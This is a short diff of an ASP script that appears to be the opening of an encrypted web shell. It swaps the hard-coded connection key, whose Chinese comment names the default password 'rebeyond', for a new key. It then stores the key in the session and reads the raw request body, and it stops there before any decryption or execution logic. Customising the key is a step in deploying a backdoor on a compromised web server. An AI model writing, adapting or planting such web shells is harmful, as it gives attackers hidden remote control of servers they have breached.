@@ -1,6 +1,6 @@
 <%
 Response.CharSet = "UTF-8" 
-k="e45e329feb5d925b" '该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
+k="1e7de5cc28c72e33"
 Session("k")=k
 size=Request.TotalBytes
 content=Request.BinaryRead(size)
